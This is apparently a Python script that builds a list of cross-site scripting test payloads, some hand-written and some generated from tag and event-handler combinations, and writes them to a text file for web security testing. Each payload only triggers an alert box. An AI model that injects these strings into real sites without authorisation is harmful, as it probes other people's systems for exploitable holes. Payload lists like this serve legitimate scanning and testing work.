# List of sample XSS payloads
xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<input type="text" value="XSS" onfocus="alert(1)">',
    '<a href="javascript:alert(1)">Click me</a>',
    '<video><source onerror="alert(1)"></video>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '"><svg onload=alert(1)>',
    '<style>@import \'javascript:alert(1)\';</style>',
    '"><iframe src="javascript:alert(1)"></iframe>',
    # Continue to add more payloads to reach the desired number
]

# Function to write XSS payloads to a text file
def write_xss_to_file(filename, payloads):
    with open(filename, 'w') as file:
        for payload in payloads:
            file.write(payload + "\n")

# Additional XSS payload generation logic
for tag in ['img', 'svg', 'iframe', 'input', 'body', 'video', 'link', 'meta']:
    for attr in ['onerror', 'onload', 'onclick', 'onfocus']:
        xss_payloads.append(f'<{tag} {attr}=alert(document.domain)>')

# Ensure unique payloads
xss_payloads = list(set(xss_payloads))

# Write to file
write_xss_to_file("xss_payloads_extended.txt", xss_payloads)